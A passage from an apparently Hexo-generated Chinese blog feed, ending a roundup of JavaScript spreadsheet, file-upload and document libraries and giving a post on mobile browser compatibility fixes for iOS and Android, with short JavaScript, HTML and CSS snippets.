title="（4）cheetah-grid"></a>（4）cheetah-grid</h2><p>cheetah-grid 是最快的 Web 开源数据表。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476161536-3abbcc9b-40ec-4330-83a3-dbc662f172fe.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476161536-3abbcc9b-40ec-4330-83a3-dbc662f172fe.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="wM1Y9"></a></p><h2 id="（5）ExcelJS"><a href="#（5）ExcelJS" class="headerlink" title="（5）ExcelJS"></a>（5）ExcelJS</h2><p>ExcelJS 是一个 Excel 电子表格文件逆向工程项目。可以读取，操作并写入电子表格数据和样式到 XLSX 和 JSON 文件。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476349708-5d038e35-8c1d-4726-a4a6-0d3daec3766f.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476349708-5d038e35-8c1d-4726-a4a6-0d3daec3766f.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="TILeH"></a></p><h2 id="（6）SheetJS"><a href="#（6）SheetJS" class="headerlink" title="（6）SheetJS"></a>（6）SheetJS</h2><p>SheetJS 是一个简化的电子表格，用意用来阅读、编辑和导出电子表格，其适用于 Web 浏览器和服务器，在 Office 365 中受 Microsoft 信任。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476602182-8862bc28-5862-42bb-b917-cfc188e0eec9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476602182-8862bc28-5862-42bb-b917-cfc188e0eec9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="hBUZq"></a></p><h1 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5. 文件上传"></a>5. 文件上传</h1><p><a name="lEYA1"></a></p><h2 id="（1）Uppy"><a href="#（1）Uppy" class="headerlink" title="（1）Uppy"></a>（1）Uppy</h2><p>Uppy 是一款时尚的模块化 JavaScript 文件上传器，可与任何应用程序无缝集成。它速度快，具有易于理解的 API，让您不必担心比构建文件上传器更重要的问题。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476760136-38d64640-c83e-469b-98c0-8ebaf58a40f0.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476760136-38d64640-c83e-469b-98c0-8ebaf58a40f0.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="hsOOV"></a></p><h2 id="（2）filepond"><a href="#（2）filepond" class="headerlink" title="（2）filepond"></a>（2）filepond</h2><p>filepond 是一个用于上传文件的 JavaScript 库，优化图像以加快上传速度，并提供出色、可访问、如丝般流畅的用户体验。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476974714-7f19e9ea-26e2-4935-a857-aafb7eff4848.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657476974714-7f19e9ea-26e2-4935-a857-aafb7eff4848.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="lSr89"></a></p><h2 id="（3）Dropzone"><a href="#（3）Dropzone" class="headerlink" title="（3）Dropzone"></a>（3）Dropzone</h2><p>Dropzone 是一个 JavaScript 库，可以将任何 HTML 元素转换为 dropzone。这意味着用户可以将文件拖放到上面，Dropzone 将显示文件预览和上传进度，并通过 XHR 为你处理上传。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477025569-e6733b01-7842-4a1e-a9cb-02b6515ff278.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477025569-e6733b01-7842-4a1e-a9cb-02b6515ff278.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="NrCXI"></a></p><h2 id="（4）vue-upload-component"><a href="#（4）vue-upload-component" class="headerlink" title="（4）vue-upload-component"></a>（4）vue-upload-component</h2><p>vue-upload-component 是一个用于 Vue.js 的上传组件，支持多文件上传，上传目录，拖拽上传，拖拽目录，以及支持同时上传多个文件等。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477195745-7a45c682-dbc4-46e7-a100-9b572e0b4148.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477195745-7a45c682-dbc4-46e7-a100-9b572e0b4148.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="i3uNl"></a></p><h2 id="（5）Uppload"><a href="#（5）Uppload" class="headerlink" title="（5）Uppload"></a>（5）Uppload</h2><p>Uppload 是一个更好的 JavaScript 图片上传器。它具有 30 多个插件的高度可定制性，完全免费和开源，并且可以与任何文件上传后端一起使用。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477331697-b633a214-5304-446a-a921-2c5f94ba08c7.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477331697-b633a214-5304-446a-a921-2c5f94ba08c7.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="VHo89"></a></p><h2 id="（6）react-dropzone"><a href="#（6）react-dropzone" class="headerlink" title="（6）react-dropzone"></a>（6）react-dropzone</h2><p>react-dropzone 是一个为 React 量身定制的，基于 HTML5 的 drop &amp;&amp; drag API，可以实现拖拽上传文件的 JavaScript 库。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477486722-9616e88f-0889-4512-bbe4-703fd462f74b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477486722-9616e88f-0889-4512-bbe4-703fd462f74b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="kdKSz"></a></p><h1 id="6-其他"><a href="#6-其他" class="headerlink" title="6. 其他"></a>6. 其他</h1><p><a name="aCKIb"></a></p><h2 id="（1）JSZip"><a href="#（1）JSZip" class="headerlink" title="（1）JSZip"></a>（1）JSZip</h2><p>JSZip 是一个使用 JavaScript 创建、读取和编辑 .zip 文件的库，具有可爱而简单的 API。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477589748-3d6503c3-d76f-44c4-9f3a-0c15b1a6d28c.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477589748-3d6503c3-d76f-44c4-9f3a-0c15b1a6d28c.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="OidiE"></a></p><h2 id="（2）docxtemplater"><a href="#（2）docxtemplater" class="headerlink" title="（2）docxtemplater"></a>（2）docxtemplater</h2><p>docxtemplater 是一个从 docx&#x2F;pptx 模板生成 docx&#x2F;pptx 文档的库。它可以用数据替换 {placeholders} 并且还支持循环和条件。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477829197-4b9a5388-8966-4e34-a492-f15bc4816485.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477829197-4b9a5388-8966-4e34-a492-f15bc4816485.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="fv8rX"></a></p><h2 id="（3）textract"><a href="#（3）textract" class="headerlink" title="（3）textract"></a>（3）textract</h2><p>textract 是一个 node.js 模块，用于从 html、pdf、doc、docx、xls、xlsx、csv、pptx、png、jpg、gif、rtf 等中提取文本。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477790788-15e888ca-153e-4527-b209-cd147ffbb850.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477790788-15e888ca-153e-4527-b209-cd147ffbb850.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="OrXng"></a></p><h2 id="（4）PptxGenJS"><a href="#（4）PptxGenJS" class="headerlink" title="（4）PptxGenJS"></a>（4）PptxGenJS</h2><p>PptxGenJS 是一个使用功能强大、简洁的 JavaScript API 创建 PowerPoint 演示文稿。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477876415-677a8519-d32f-4c40-97d8-7e03df74db21.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657477876415-677a8519-d32f-4c40-97d8-7e03df74db21.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="EShJw"></a></p><h2 id="（5）officegen"><a href="#（5）officegen" class="headerlink" title="（5）officegen"></a>（5）officegen</h2><p>officegen 是一个用于 JavaScript 中 Word (docx)、PowerPoint (pptx) 和 Excell (xlsx) 的独立 Office Open XML 文件（Microsoft Office 2007 及更高版本）生成器。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657478146268-be5fbfc2-cced-420c-83ab-7850444598b5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657478146268-be5fbfc2-cced-420c-83ab-7850444598b5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="wlC6r"></a></p><h2 id="（6）PapaParse"><a href="#（6）PapaParse" class="headerlink" title="（6）PapaParse"></a>（6）PapaParse</h2><p>PapaParse 是一个快速而强大的 CSV（分隔文本）解析器，可以优雅地处理大文件和格式错误的输入。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657478027071-66df0d49-f1c8-48cb-afbb-f43701ff4975.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/1500604/1657478027071-66df0d49-f1c8-48cb-afbb-f43701ff4975.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><br /><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收藏 </tag>
            
            <tag> 文件处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js常见兼容问题</title>
      <link href="/2021/12/21/compatible/js-compatible/"/>
      <url>/2021/12/21/compatible/js-compatible/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><a name="aqBRj"></a><h3 id="iPhone7-用-for…in-遍历数组失效"><a href="#iPhone7-用-for…in-遍历数组失效" class="headerlink" title="iPhone7 用 for…in 遍历数组失效"></a>iPhone7 用 for…in 遍历数组失效</h3><p>问题描述：最初学习使用 js 时，觉得<code>for...in</code>遍历比<code>for循环</code>简洁，后期在用户反馈后发现 iPhone7 不支持用 for…in 遍历数组<br />解决方式： 改为<code>for循环</code>遍历</p><p><a name="kiAHW"></a></p><h3 id="移动端点击事件-300-ms-延迟问题"><a href="#移动端点击事件-300-ms-延迟问题" class="headerlink" title="移动端点击事件 300 ms 延迟问题"></a>移动端点击事件 300 ms 延迟问题</h3><p>问题描述：移动端 web 网页是有 300ms 延迟的，往往会造成按钮点击延迟甚至是点击失效。<br />解决方式：</p><ul><li>fastclick 可以解决在手机上点击事件的 300ms 延迟</li><li>zepto.js 的 touch 模块，tap 事件也是为了解决在 click 的延迟问题</li></ul><p><a name="nK6Db"></a></p><h3 id="audio-和-video-在-ios-和-andriod-中自动播放"><a href="#audio-和-video-在-ios-和-andriod-中自动播放" class="headerlink" title="audio 和 video 在 ios 和 andriod 中自动播放"></a>audio 和 video 在 ios 和 andriod 中自动播放</h3><p>出于优化用户体验，苹果系统和安卓系统通常都会禁止自动播放和禁止页面加载时使用 JS 触发播放，必须由用户主动点击页面才可以触发播放。通过给页面根元素加 touchstart 的监听事件实现触发播放</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&quot;html&quot;</span>).<span class="title function_">one</span>(<span class="string">&quot;touchstart&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  audio.<span class="title function_">play</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="aIKcn"></a></p><h3 id="iOS-上拉边界下拉出现空白"><a href="#iOS-上拉边界下拉出现空白" class="headerlink" title="iOS 上拉边界下拉出现空白"></a>iOS 上拉边界下拉出现空白</h3><p>问题描述：手指按住屏幕下拉，屏幕顶部会多出一块白色区域。手指按住屏幕上拉，底部多出一块白色区域。<br />产生原因：在 iOS 中，手指按住屏幕上下拖动，会触发 touchmove 事件。这个事件触发的对象是整个 webview 容器，容器自然会被拖动，剩下的部分会成空白。<br />解决方式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(</span><br><span class="line">  <span class="string">&quot;touchmove&quot;</span>,</span><br><span class="line">  <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (e.<span class="property">_isScroller</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 阻止默认事件</span></span><br><span class="line">    e.<span class="title function_">preventDefault</span>();</span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">passive</span>: <span class="literal">false</span>,</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><a name="emtPB"></a></p><h3 id="ios-日期转换-NAN-的问题"><a href="#ios-日期转换-NAN-的问题" class="headerlink" title="ios 日期转换 NAN 的问题"></a>ios 日期转换 NAN 的问题</h3><p>将日期字符串的格式符号替换成’&#x2F;‘</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;yyyy-MM-dd&quot;</span>.<span class="title function_">replace</span>(<span class="regexp">/-/g</span>, <span class="string">&quot;/&quot;</span>);</span><br></pre></td></tr></table></figure><p><a name="ibcS5"></a></p><h3 id="软键盘问题"><a href="#软键盘问题" class="headerlink" title="软键盘问题"></a>软键盘问题</h3><p><a name="oXllV"></a></p><h4 id="iOS-系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格"><a href="#iOS-系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格" class="headerlink" title="iOS 系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格"></a>iOS 系统中文输入法输入英文时，字母之间可能会出现一个六分之一空格</h4><p>解决方式：可以通过正则去掉</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">value</span> = <span class="variable language_">this</span>.<span class="property">value</span>.<span class="title function_">replace</span>(<span class="regexp">/\u2006/g</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p><a name="Qmh75"></a></p><h4 id="IOS-键盘弹起挡住原来的视图"><a href="#IOS-键盘弹起挡住原来的视图" class="headerlink" title="IOS 键盘弹起挡住原来的视图"></a>IOS 键盘弹起挡住原来的视图</h4><p>解决方式：</p><ul><li>可以通过监听移动端软键盘弹起 Element.scrollIntoViewIfNeeded（Boolean）方法用来将不在浏览器窗口的可见区域内的元素滚动到浏览器窗口的可见区域。 如果该元素已经在浏览器窗口的可见区域内，则不会发生滚动。</li><li>true，则元素将在其所在滚动区的可视区域中居中对齐。</li><li>false，则元素将与其所在滚动区的可视区域最近的边缘对齐。 根据可见区域最靠近元素的哪个边缘，元素的顶部将与可见区域的顶部边缘对准，或者元素的底部边缘将与可见区域的底部边缘对准。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">activeElement</span>.<span class="property">tagName</span> === <span class="string">&quot;INPUT&quot;</span> ||</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">activeElement</span>.<span class="property">tagName</span> === <span class="string">&quot;TEXTAREA&quot;</span></span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="string">&quot;scrollIntoView&quot;</span> <span class="keyword">in</span> <span class="variable language_">document</span>.<span class="property">activeElement</span>) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">activeElement</span>.<span class="title function_">scrollIntoView</span>(<span class="literal">false</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">activeElement</span>.<span class="title function_">scrollIntoViewIfNeeded</span>(<span class="literal">false</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="RQUuS"></a></p><h4 id="onkeyUp-和-onKeydown-兼容性问题"><a href="#onkeyUp-和-onKeydown-兼容性问题" class="headerlink" title="onkeyUp 和 onKeydown 兼容性问题"></a>onkeyUp 和 onKeydown 兼容性问题</h4><p>IOS 中 input 键盘事件 keyup、keydown、等支持不是很好, 用 input 监听键盘 keyup 事件，在安卓手机浏览器中没有问题，但是在 ios 手机浏览器中用输入法输入之后，并未立刻相应 keyup 事件</p><p><a name="vb5qX"></a></p><h4 id="IOS12-输入框难以点击获取焦点，弹不出软键盘"><a href="#IOS12-输入框难以点击获取焦点，弹不出软键盘" class="headerlink" title="IOS12 输入框难以点击获取焦点，弹不出软键盘"></a>IOS12 输入框难以点击获取焦点，弹不出软键盘</h4><p>定位找到问题是 fastclick.js 对 IOS12 的兼容性，可在 fastclick.js 源码或者 main.js 做以下修改</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">FastClick</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">focus</span> = <span class="keyword">function</span> (<span class="params">targetElement</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> length;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    deviceIsIOS &amp;&amp;</span><br><span class="line">    targetElement.<span class="property">setSelectionRange</span> &amp;&amp;</span><br><span class="line">    targetElement.<span class="property">type</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;date&quot;</span>) !== <span class="number">0</span> &amp;&amp;</span><br><span class="line">    targetElement.<span class="property">type</span> !== <span class="string">&quot;time&quot;</span> &amp;&amp;</span><br><span class="line">    targetElement.<span class="property">type</span> !== <span class="string">&quot;month&quot;</span></span><br><span class="line">  ) &#123;</span><br><span class="line">    length = targetElement.<span class="property">value</span>.<span class="property">length</span>;</span><br><span class="line">    targetElement.<span class="title function_">setSelectionRange</span>(length, length);</span><br><span class="line">    targetElement.<span class="title function_">focus</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    targetElement.<span class="title function_">focus</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><a name="vo5o5"></a></p><h4 id="IOS-键盘收起时页面没用回落，底部会留白"><a href="#IOS-键盘收起时页面没用回落，底部会留白" class="headerlink" title="IOS 键盘收起时页面没用回落，底部会留白"></a>IOS 键盘收起时页面没用回落，底部会留白</h4><p>通过监听键盘回落时间滚动到原来的位置</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;focusout&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">scrollTo</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//input输入框弹起软键盘的解决方案。</span></span><br><span class="line"><span class="keyword">var</span> bfscrolltop = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollTop</span>;</span><br><span class="line">$(<span class="string">&quot;input&quot;</span>)</span><br><span class="line">  .<span class="title function_">focus</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollTop</span> = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollHeight</span>;</span><br><span class="line">    <span class="comment">//console.log(document.body.scrollTop);</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">blur</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">scrollTop</span> = bfscrolltop;</span><br><span class="line">    <span class="comment">//console.log(document.body.scrollTop);</span></span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p><a name="ALt6l"></a></p><h4 id="IOS-下-fixed-失效"><a href="#IOS-下-fixed-失效" class="headerlink" title="IOS 下 fixed 失效"></a>IOS 下 fixed 失效</h4><p>问题描述：软键盘唤起后，页面的 fixed 元素将失效，变成了 absolute，所以当页面超过一屏且滚动时，失效的 fixed 元素就会跟随滚动了。不仅限于 type&#x3D;text 的输入框，凡是软键盘（比如时间日期选择、select 选择等等）被唤起，都会遇到同样地问题。 解决方法: 不让页面滚动，而是让主体部分自己滚动,主体部分高度设为 100%，overflow:scroll</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;warper&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&#x27;main&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;fix-bottom&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.warper</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: absolute;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">right</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">overflow-y</span>: scroll;</span><br><span class="line">  -webkit-<span class="attribute">overflow</span>-scrolling: touch;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.fix-bottom</span> &#123;</span><br><span class="line">  <span class="attribute">position</span>: fixed;</span><br><span class="line">  <span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" 